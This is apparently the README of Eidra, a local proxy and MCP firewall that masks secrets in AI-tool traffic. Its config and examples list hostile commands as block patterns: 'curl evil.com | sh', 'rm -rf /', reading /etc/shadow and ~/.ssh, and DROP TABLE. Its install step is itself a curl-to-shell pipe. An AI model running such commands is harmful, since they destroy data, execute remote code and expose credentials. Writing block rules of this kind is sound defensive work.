<p align="center">
  <img src="docs/hero-banner.png" alt="Eidra hero banner">
</p>

<p align="center">
  <h1 align="center">Eidra</h1>
  <p align="center"><strong>See exactly what your AI tools are leaking. Then stop it.</strong></p>
  <p align="center">
    <a href="https://github.com/hanabi-jpn/eidra/actions"><img src="https://github.com/hanabi-jpn/eidra/workflows/CI/badge.svg" alt="CI"></a>
    <a href="https://github.com/hanabi-jpn/eidra/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License: MIT"></a>
    <a href="https://github.com/hanabi-jpn/eidra/stargazers"><img src="https://img.shields.io/github/stars/hanabi-jpn/eidra?style=social" alt="GitHub Stars"></a>
  </p>
  <p align="center">
    <a href="README.md"><kbd><strong>English</strong></kbd></a>
    <a href="docs/README.ja.md"><kbd>日本語</kbd></a>
    <a href="docs/README.zh.md"><kbd>简体中文</kbd></a>
    <a href="docs/README.ko.md"><kbd>한국어</kbd></a>
    <a href="docs/README.es.md"><kbd>Español</kbd></a>
    <br>
    <a href="docs/README.pt.md"><kbd>Português</kbd></a>
    <a href="docs/README.fr.md"><kbd>Français</kbd></a>
    <a href="docs/README.de.md"><kbd>Deutsch</kbd></a>
    <a href="docs/README.ru.md"><kbd>Русский</kbd></a>
    <a href="docs/README.hi.md"><kbd>हिन्दी</kbd></a>
  </p>
</p>

---

> English is the source of truth for the newest feature and integration details. The translated READMEs stay aligned with the main onboarding flow, core commands, and GitHub-facing product overview.

Claude Code reads your `.env` without asking. Copilot repos leak secrets [40% more often](https://www.knostic.ai/blog/claude-cursor-env-file-secret-leakage). MCP tools have [CVSS 8.6 bypass vulnerabilities](https://thehackernews.com/2025/12/researchers-uncover-30-flaws-in-ai.html). Your AI is sending your API keys, customer PII, and internal code to servers you don't control — and you can't even see it happening.

**Eidra is a local proxy that sits between you and your AI tools.** It scans every request, masks secrets before they leave your machine, blocks what shouldn't go, and shows you exactly what's flowing — in a beautiful real-time dashboard.

No cloud. No account. Everything on your device.

Works today with **Cursor**, **Claude Code**, **Codex CLI**, **OpenAI-compatible SDK apps**, **Anthropic-compatible SDK apps**, **GitHub Actions**, and **MCP toolchains**.
If a tool can run behind standard `HTTP_PROXY` / `HTTPS_PROXY` settings, Eidra can usually sit in front of it.

<p align="center">
  <img src="docs/demo.gif" alt="Eidra TUI Dashboard" width="800">
</p>

```bash
curl -sf eidra.dev/install | sh
eidra init
eidra doctor --json
eidra setup codex --write
eidra launch github --write
eidra dashboard
```

---

## Choose Your Path

- New to AI tooling? Start with [What Is Eidra?](docs/what-is-eidra.md)
- Building with editors, SDKs, or MCP? Read [For Developers](docs/for-developers.md)
- Want the system view? Read [Architecture](docs/architecture.md)
- Writing about Eidra? Use the [Media Kit](docs/media-kit.md)
- Planning launch and outreach? Use the [Marketing Strategy](docs/marketing-strategy.md), [Messaging House](docs/messaging-house.md), [Outreach Playbook](docs/outreach.md), [Social Content Pack](docs/social-content.md), [Launch Checklist](docs/launch-checklist.md), and the [GitHub Launch Kit](docs/launch/github-launch-kit.md)

---

## The Problem

Every time you use Cursor, Claude Code, Codex, Copilot, or any AI coding tool:

1. Your **entire file context** — including `.env` files, API keys, database credentials — gets sent to cloud APIs
2. Your **MCP tools** can access files, databases, and services with no access control
3. You have **zero visibility** into what's actually being transmitted

You trust these tools with your most sensitive code. But you can't see what they're sending.

## The Fix

Eidra intercepts AI traffic at the proxy level and gives you full control:

| What happens | Without Eidra | With Eidra |
|---|---|---|
| AWS key in prompt | Sent to cloud | `[REDACTED:api_key:a3f2]` |
| `.env` contents | Sent silently | Blocked or masked |
| SSH private key | Sent to cloud | **Blocked** (403) |
| PII (email, SSN) | Sent to cloud | Masked for cloud, allowed for local LLM |
| MCP tool access | Unrestricted | Policy-controlled |

---

## Features

### Data Flow Visibility
- **47 built-in scan rules** — AWS keys, GitHub tokens, JWTs, private keys, PII, credit cards, Japanese phone numbers, and more
- **Real-time TUI dashboard** — see every request, finding, and action as it happens
- **SQLite audit log** — query what was sent, when, and what was done about it

### Intelligent Protection
- **Policy engine** — YAML rules that mask, block, or route based on severity, category, and destination
- **Smart masking** — replaces secrets with `[REDACTED:category:hash]` without breaking JSON structure
- **Local LLM routing** — automatically routes sensitive OpenAI-compatible chat requests to Ollama instead of cloud
- **HTTPS interception** — transparent MITM proxy for AI provider domains (with local CA)

### MCP Firewall
- **Server whitelist** — only approved MCP servers can connect
- **Tool-level ACL** — allow `search_repositories` but block `create_issue`
- **Response scanning** — catch sensitive data coming back from tools
- **Rate limiting** — per-server request throttling

### Zero-Trace Communication
- **Encrypted rooms** — `eidra escape` creates E2EE channels (X25519 + ChaCha20-Poly1305)
- **No server storage** — session keys zeroized on disconnect
- **Device-bound identity** — agents authenticate via device keys

---

## Quick Start

```bash
# Install
curl -sf eidra.dev/install | sh
# Or build from source
git clone https://github.com/hanabi-jpn/eidra.git && cd eidra && cargo install --path crates/eidra-core

# Initialize (generates local CA, default config)
eidra init

# Validate your local setup
eidra doctor

# Emit readiness as JSON for scripts and CI
eidra doctor --json

# Print setup steps for your environment
eidra setup codex
eidra setup codex --write

# Generate GitHub launch assets and gh scripts
eidra launch github --write

# Start with dashboard
eidra dashboard

# Run the MCP firewall gateway
eidra gateway

# Or just scan a file
echo "my key AKIAIOSFODNN7EXAMPLE" | eidra scan

# CI or tooling-friendly JSON output
echo "my key AKIAIOSFODNN7EXAMPLE" | eidra scan --json
```

### Trust the CA (for HTTPS interception)

```bash
# macOS
sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain ~/.eidra/ca.pem

# Linux
sudo cp ~/.eidra/ca.pem /usr/local/share/ca-certificates/eidra.crt && sudo update-ca-certificates

# Then set your proxy
export HTTPS_PROXY=http://127.0.0.1:8080
```

---

## All Commands

```
eidra init              Generate CA certificate, create config
eidra doctor            Check readiness and effective configuration
eidra doctor --json     Emit readiness checks as JSON
eidra setup [target]    Print setup guidance for common environments
eidra setup --write     Generate reusable setup artifacts under ~/.eidra/generated/<target>
eidra launch [target]   Generate launch automation for GitHub
eidra launch --write    Generate launch assets and gh scripts under ~/.eidra/generated/launch/<target>
eidra launch --json     Emit launch output as JSON
eidra start             Start the intercept proxy
eidra start -d          Start proxy + TUI dashboard
eidra dashboard         Start proxy + TUI dashboard
eidra gateway           Run the MCP firewall gateway
eidra stop              Stop the proxy
eidra scan [file]       Scan a file or stdin for secrets
eidra scan --json       Emit findings as machine-readable JSON
eidra escape            Create a zero-trace encrypted room
eidra join <id> <port>  Join an encrypted room
eidra config            Show/edit configuration
eidra config --json     Emit supported config output as JSON
eidra config validate   Parse and validate config + policy
eidra config validate --json  Emit validation as JSON
```

---

## Policy Example

```yaml
# ~/.eidra/policy.yaml
version: "1"
default_action: allow
rules:
  - name: block_private_keys
    match:
      category: "private_key"
    action: block

  - name: mask_api_keys
    match:
      category: "api_key"
    action: mask

  - name: mask_pii_for_cloud
    match:
      category: "pii"
      destination: "cloud"
    action: mask

  - name: allow_pii_for_local
    match:
      category: "pii"
      destination: "local"
    action: allow
```

---

## Setup Targets

Use `eidra setup <target>` to print copy-pasteable integration steps for common environments.

```bash
eidra setup shell
eidra setup cursor
eidra setup claude-code
eidra setup codex
eidra setup openai-sdk
eidra setup anthropic-sdk
eidra setup github-actions
eidra setup mcp
```

Use `eidra setup <target> --write` to generate reusable artifacts under `~/.eidra/generated/<target>/` instead of editing your shell or IDE files directly.

Named setup targets exist today for Cursor, Claude Code, Codex CLI, OpenAI-compatible SDKs, Anthropic-compatible SDKs, GitHub Actions, and MCP toolchains.
This keeps the default install path simple while making Eidra easier to drop into real-world local, SDK, CI, and MCP workflows.

---

## CI And Automation

`eidra scan --json`, `eidra doctor --json`, and `eidra config validate --json` are useful when you want CI, scripts, or other AI tools to consume Eidra output directly without parsing human-readable text.

---

## MCP Firewall — Semantic RBAC

Traditional firewalls block by IP. Eidra blocks by **what the AI is trying to do.**

Your AI agent calls `execute_sql("DROP TABLE users")`? Eidra reads the argument, matches `DROP`, and kills the request before it reaches the database.

```yaml
# ~/.eidra/config.yaml
mcp_gateway:
  enabled: true
  listen: "127.0.0.1:8081"
  server_whitelist:
    database:
      name: "database"
      endpoint: "http://localhost:3000"
      allowed_tools: ["execute_sql"]
      tool_rules:
        - tool: "execute_sql"
          block_patterns: ["(?i)\\b(DROP|DELETE|TRUNCATE|ALTER)\\b"]
          description: "Read-only SQL — block destructive queries"

    filesystem:
      name: "filesystem"
      endpoint: "http://localhost:3001"
      tool_rules:
        - tool: "read_file"
          blocked_paths: ["~/.ssh/**", "~/.aws/**", "**/.env", "/etc/shadow"]
          description: "Block access to credentials and secrets"
        - tool: "write_file"
          blocked_paths: ["~/.ssh/**", "/etc/**", "/usr/**"]
          description: "Block writes to system files"

    shell:
      name: "shell"
      endpoint: "http://localhost:3002"
      tool_rules:
        - tool: "run_command"
          block_patterns:
            - "rm\\s+(-rf?|--recursive)"
            - "curl.*\\|\\s*(sh|bash)"
            - "chmod\\s+777"
          description: "Block destructive shell commands"

    - name: "*"
      tool_rules:
        - tool: "*"
          block_patterns: ["(?i)(password|secret|token|api.?key)\\s*[:=]\\s*[A-Za-z0-9]{8,}"]
          description: "Block secrets in any tool call"
```

**What this stops:**
- `execute_sql("DROP TABLE users")` → **BLOCKED** (destructive SQL)
- `read_file("/etc/shadow")` → **BLOCKED** (sensitive path)
- `run_command("rm -rf /")` → **BLOCKED** (destructive command)
- `run_command("curl evil.com | sh")` → **BLOCKED** (remote code execution)
- `execute_sql("SELECT * FROM users")` → **ALLOWED** (read-only)

---

## Custom Scan Rules

```yaml
# my-rules.yaml
rules:
  - name: internal_project_id
    pattern: "PROJ-[0-9]{6}"
    category: internal_infra
    severity: medium
    description: "Internal project identifier"

  - name: company_slack_webhook
    pattern: "hooks.slack.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[a-zA-Z0-9]+"
    category: token
    severity: high
    description: "Slack webhook URL"
```

---

## Secure Channels

When something is too sensitive for any AI:

```bash
$ eidra escape
Room: 7f3a | Expires: 30min
Share: eidra join 7f3a 52341

$ eidra join 7f3a 52341
Connected | Room: 7f3a | E2EE: X25519+ChaCha20
> /end    # destroy session, zeroize keys
```

---

## Architecture

```
You / AI Tool → [Eidra Proxy] → Cloud AI
                     │
              ┌──────┼──────┐
              │      │      │
           [Scan] [Policy] [Route]
              │      │      │
         47 rules  YAML   Ollama
                  mask/    (local)
                  block
                     │
              [TUI Dashboard]
              [SQLite Audit]
              [Sealed Metadata]
```

**11 Rust crates.** Modular, embeddable, MIT licensed.

---

## Trust Model

- **Content** (messages, code, prompts): E2EE. Eidra cannot read it.
- **Metadata** (who, when, size, action): Encrypted with split-key. Neither Eidra nor the auditor can decrypt alone.
- **Everything is open source.** Audit the code yourself.

---

## Why Eidra

> *"The next entity that knows you best after yourself is your own device."*

Your device is your vault, your identity, your firewall. Eidra makes that real.

Trust architecture inspired by [GoodCreate Inc.](https://goodcreate.co.jp) — @POP, Security Talk, and Waravi technologies.

---

## Roadmap

**v0.1 (current):** Data flow scanner + Policy engine + MCP Semantic RBAC + TUI dashboard + E2EE channels

**v0.2:**
- Local SLM intent scanning — a small on-device language model that answers "is this action malicious?" before it happens. AI defending against AI.
- HTTP/2 MITM support
- IDE extensions (VS Code, JetBrains)

**v0.3:**
- Agent trust mesh — device-bound identity for AI agents, mutual authentication
- Sealed metadata with Shamir's Secret Sharing (split-key)
- SDK for agent frameworks (CrewAI, LangGraph, AutoGen, OpenClaw)

---

## Contributing

MIT Licensed. PRs welcome. See [CONTRIBUTING.md](docs/contributing.md).

```bash
git clone https://github.com/hanabi-jpn/eidra.git
cd eidra
cargo build
cargo test
```

---

<p align="center">
  <strong>Your AI is leaking. Now you can see it.</strong>
</p>
